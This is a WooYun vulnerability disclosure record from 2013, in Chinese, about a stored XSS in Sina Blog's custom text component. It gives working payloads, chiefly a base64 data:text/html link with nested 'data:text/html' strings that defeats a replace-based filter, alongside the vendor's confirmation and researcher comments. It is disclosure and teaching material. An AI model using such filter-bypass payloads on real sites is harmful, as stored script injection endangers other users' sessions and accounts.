{"id": 9459, "wybug_id": "wooyun-2013-033916", "wybug_title": "新浪博客储存型XSS+过滤器猥琐绕过（黑盒XSS技巧）", "wybug_corp": "新浪", "wybug_author": "LaiX", "wybug_date": "2013-08-09 08:35", "wybug_open_date": "2013-09-23 08:35", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "利用技巧", "黑盒测试技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向公众公开  简要描述： 新浪某储存型XSS有过滤器，猥琐的绕过... 详细说明：  新浪某储存型XSS有过滤器，猥琐的绕过...   漏洞证明：  打开新浪博客，点击 页面设置\n\n点击 自定义组件\n\n点击 添加文本组件\n\n点击 显示源代码\n\n插入\n<a href=\"javascript:\">test</a>\n保存发现只要存在javascript整条a标签直接挂掉..换个姿势插个属性\n<img src=x onerror>\n测试发现会直接删除 后台黑名单 内的属性，试了一下无法绕过。接着用必杀技\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik7PC9zY3JpcHQ+\">test</a>\n测试发现 ; 号 前面的所有会被删除，被过滤成:\n<a href=\";base64,PHNjcmlwdD5hbGVydCgieHNzIik7PC9zY3JpcHQ+\">test</a>\n根据多年经验，我判断这一定是用replace过滤的，所以我构造如下姿势进行绕过。\n<a href=\"datadata:text/html:data:text/htmltextdata:text/html/data:text/htmlhtml;base64,PHNjcmlwdD5hbGVydCgieHNzIik7PC9zY3JpcHQ+\">test</a>\n插入成功：\n\n点击一下，它弹起来了\n\n   修复方案：  请换一种思路过滤...   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2013-08-09 09:57 厂商回复： 感谢关注新浪安全，已安排人员进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-09 09:25 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  mark    \n     2013-08-09 09:47 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  黑盒到底有多黑    \n     2013-08-09 12:33 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:21        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  我来看看    \n     2013-08-29 10:25 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  date？这样也可以弹额，学习了    \n     2013-08-30 08:47 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  学习新姿势了。    \n     2013-09-09 19:09 |    \t\to丨Reborn \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 白帽子)\t\t \n  学习。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}